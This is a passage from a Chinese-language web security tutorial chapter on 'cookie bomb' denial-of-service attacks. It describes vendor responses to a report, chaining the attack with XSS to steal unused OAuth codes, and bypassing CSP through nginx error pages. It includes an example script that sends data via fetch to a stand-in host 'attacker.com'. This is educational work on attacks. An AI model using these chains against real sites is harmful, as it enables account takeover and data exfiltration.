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" width="1073" height="498" class="img_ev3q"></p><p>我後來有把這個漏洞回報給 Tumblr，隔天就收到回覆，對方回說：</p><blockquote><p>this behavior does not pose a concrete and exploitable risk to the platform in and on itself, as this can be fixed by clearing the cache, and is more of a nuisance than a security vulnerability</p></blockquote><p>對有些公司來說，如果只有 cookie bomb 的話造成的危害太小，而且第一受害者必須點那個網址，第二只要把 cookie 清掉就沒事，所以並不認為這是一個安全性的漏洞。</p><p>而微軟的回應也是類似，單純只有 cookie bomb 的話並沒有辦法達到他們對於資安漏洞的最低標準。</p><p>那到底 cookie bomb 可以串接什麼其他漏洞一起用呢？</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="cookie-bomb-的漏洞連連看">Cookie bomb 的漏洞連連看<a href="#cookie-bomb-的漏洞連連看" class="hash-link" aria-label="Cookie bomb 的漏洞連連看的直接連結" title="Cookie bomb 的漏洞連連看的直接連結">​</a></h2><p>在資安的領域中怎麼把不同的，看似很小的一些問題串在一起變成大問題，一直以來都是一門藝術。只有 cookie bomb 可能做不了什麼，但跟其他東西結合之後搞不好可以變出一個嚴重的漏洞。例如說我們之前就看過利用 same-site 網站繞過 same-site cookie 限制，再利用 <code>content-type</code> 的解析問題繞過 CORS 限制，最後就變成一個 CSRF 的漏洞。</p><p>我要介紹的第一個案例出現在上一篇尾聲推薦的由 filedescriptor 在 2019 年於 HITCON CMT 的演講：<a href="https://www.youtube.com/watch?v=njQcVWPB1is&amp;ab_channel=HITCON" target="_blank" rel="noopener noreferrer">The cookie monster in your browsers</a>。</p><p>他在 <code>example.com</code> 上找到一個 XSS 漏洞，而這個網站的登入使用了 Google 的 OAuth，於是他想說應該可以用 XSS 偷到 OAuth 的 code，如果偷到的話就可以直接用使用者的身份登入，變成了更嚴重的 account takeover 漏洞。</p><p>一般的 OAuth 流程是這樣的：</p><ol><li>使用者點擊「Google 登入」按鈕</li><li>網頁跳轉到 <code>https://google.com/oauth?client_id=example</code></li><li>使用者在 Google 上面登入並且授權</li><li>網頁跳轉到 <code>https://example.com/oauth/callback?code=123</code></li><li>網頁跳轉到 <code>https://example.com/home</code>，顯示為登入狀態</li></ol><p>如果已經授權過了的話，會省略掉第三個步驟，直接跳轉。</p><p>而現在的問題是 code 只能用一次，一旦造訪了 <code>https://example.com/oauth/callback?code=123</code>，這個 code 就會被前端或是後端拿去使用，就算偷到也沒用了。於是，cookie bomb 派上用場的時機就到了。</p><p>我們現在因為有 <code>example.com</code> 的 XSS，等同於是對頁面有完全的控制權，可以先寫入 cookie 並且對 <code>/oauth</code> 這個路徑執行 cookie bomb，接著新增一個 iframe，嵌入的網址是 <code>https://google.com/oauth?client_id=example</code>，而此時授權完成後 iframe 會被重新導向到 <code>https://example.com/oauth/callback?code=123</code>，這時候因為 cookie bomb 的關係，伺服器會回傳錯誤，這時候我們就可以拿到 iframe 的網址，同時也就取得了 code，而且確定是沒有人使用過的。</p><p>第二個案例則是與 CSP bypass 有關，有些網站的 CSP 可能不是直接從後端應用程式那邊加上的，而是用像 nginx 這種的 reverse proxy 統一加的：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    server {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        listen 80;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        server_name _;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        index index.php;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        root /www;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        location / {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            try_files $uri $uri/ /index.php?$query_string;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            add_header Content-Security-Policy &quot;script-src &#x27;none&#x27;; object-src &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            location ~ \.php$ {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                try_files $uri =404;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                fastcgi_pass unix:/run/php-fpm.sock;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                fastcgi_index index.php;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                include fastcgi_params;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="複製代碼至剪貼簿" title="複製" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>乍看之下沒問題，但如果 nginx 回傳的是 4xx 或 5xx 的錯誤，response 中是不會加上這個 header 的。這是 nginx 的預設行為，在<a href="https://nginx.org/en/docs/http/ngx_http_headers_module.html#add_header" target="_blank" rel="noopener noreferrer">文件</a>上也有寫到：</p><blockquote><p>Adds the specified field to a response header provided that the response code equals 200, 201 (1.3.10), 204, 206, 301, 302, 303, 304, 307 (1.1.16, 1.0.13), or 308 (1.13.0).</p></blockquote><p>因此，我們就可以利用 cookie bomb 做出一個錯誤頁面，這個頁面上面就不會有 CSP header。有些人會疑惑說，可是這是個錯誤頁面，那沒有 CSP 有什麼用呢？</p><p>假設原本頁面的 CSP 超級嚴格好了，所有的指示都設成 <code>&#x27;self&#x27;</code>，只有 <code>script-src</code> 多了一個 <code>unsafe-inline</code>，而我們又找到了一個 XSS，所以可以執行程式碼。</p><p>但問題是，我們的資料傳送不出去啊！因為 CSP 的緣故，把所有的外部連結都擋住了。這時候我們就可以用 cookie bomb 先轟炸 <code>/test</code> 頁面，接著把 <code>/test</code> 頁面放到 iframe 裡面。</p><p>放到 iframe 裡面去以後，由於符合同源政策，所以我可以直接存取到 <code>/test</code> 頁面，而這個頁面是沒有 CSP 的，因此就可以從這個頁面發出 request，範例如下：</p><div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">iframe</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">id</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value" style="color:#e3116c">f</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">src</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">/test</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag special-attr attr-name" style="color:#00a4db">onload</span><span class="token tag special-attr attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag special-attr attr-value value javascript language-javascript function" style="color:#d73a49">run</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation" style="color:#393A34">(</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation" style="color:#393A34">)</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">iframe</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript">  </span><span class="token script language-javascript keyword" style="color:#00009f">function</span><span class="token script language-javascript"> </span><span class="token script language-javascript function" style="color:#d73a49">run</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript"> </span><span class="token script language-javascript punctuation" style="color:#393A34">{</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript">    f</span><span class="token script language-javascript punctuation" style="color:#393A34">.</span><span class="token script language-javascript property-access">contentWindow</span><span class="token script language-javascript punctuation" style="color:#393A34">.</span><span class="token script language-javascript method function property-access" style="color:#d73a49">fetch</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript string" style="color:#e3116c">&#x27;https://attacker.com?data=...&#x27;</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript">  </span><span class="token script language-javascript punctuation" style="color:#393A34">}</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="複製代碼至剪貼簿" title="複製" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>像這種就是透過 DoS 搭配 iframe 來繞過 CSP 限制的方法。</p><p>（話說 CSP 目前其實還做不到「把所有外部連線都擋住」，如果只是要對外發送請求的話，還有其他更快速的方法，例如說利用 <code>location=...</code> 來做頁面跳轉之類的）</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="結語">結語<a href="#結語" class="hash-link" aria-label="結語的直接連結" title="結語的直接連結">​</a></h2><p>在這篇文章中，我們看到了另外一種利用 cookie 的方式，把它當成是執行 DoS 的手段，讓網頁無法載入。雖然說只有這個漏洞本身影響並不大，許多公司也不把這個當成一個資安漏洞，但如果與其他手法結合起來，就有機會變成影響力更大的漏洞。</p><p>這篇是第四章「跨越限制攻擊其他網站」的結尾，在最近幾篇中我們先是搞懂了 origin 與 site 的差別，再來學到了 CORS 的設定以及設定錯誤會導致的結果，然後看到了 CSRF 以及 same-site cookie，最後探討了拿到 same-site 的控制權以後可以執行哪些攻擊。</p><p>從下一篇開始會進入到第五章：「其他有趣的前端資安主題」。</p><p>本文改寫自：<a href="https://blog.huli.tw/2021/07/10/cookie-bomb/" target="_blank" rel="noopener noreferrer">利用 Cookie 特性進行的 DoS 攻擊：Cookie 炸彈</a></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件選項卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/beyond-xss/ch4/subdomain/"><div class="pagination-nav__sublabel">上一頁</div><div class="pagination-nav__label">從 same-site 網站打進你家</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/beyond-xss/ch5/clickjacking/"><div class="pagination-nav__sublabel">下一頁</div><div class="pagination-nav__label">你的畫面不是你的畫面：Clickjacking 點擊劫持</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#cookie-bomb-介紹" class="table-of-contents__link toc-highlight">Cookie bomb 介紹</a></li><li><a href="#攻擊流程" class="table-of-contents__link toc-highlight">攻擊流程</a></li><li><a href="#防禦方式" class="table-of-contents__link toc-highlight">防禦方式</a></li><li><a href="#攻擊面擴展" class="table-of-contents__link toc-highlight">攻擊面擴展</a></li><li><a href="#找到輕易設置-cookie-的地方" class="table-of-contents__link toc-highlight">找到輕易設置 cookie 的地方</a></li><li><a href="#實際測試" class="table-of-contents__link toc-highlight">實際測試</a></li><li><a href="#防禦方式-1" class="table-of-contents__link toc-highlight">防禦方式</a></li><li><a href="#再看一個實際的案例" class="table-of-contents__link toc-highlight">再看一個實際的案例</a></li><li><a href="#cookie-bomb-的漏洞連連看" class="table-of-contents__link toc-highlight">Cookie bomb 的漏洞連連看</a></li><li><a href="#結語" class="table-of-contents__link toc-highlight">結語</a></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2023 Huli. All rights reserved. Built with Docusaurus.</div></div></div></footer></div>
<script src="/beyond-xss/assets/js/runtime~main.d379f94d.js"></script>
<script src="/beyond-xss/assets/js/main.f124e165.js"></script>
</body>
</html>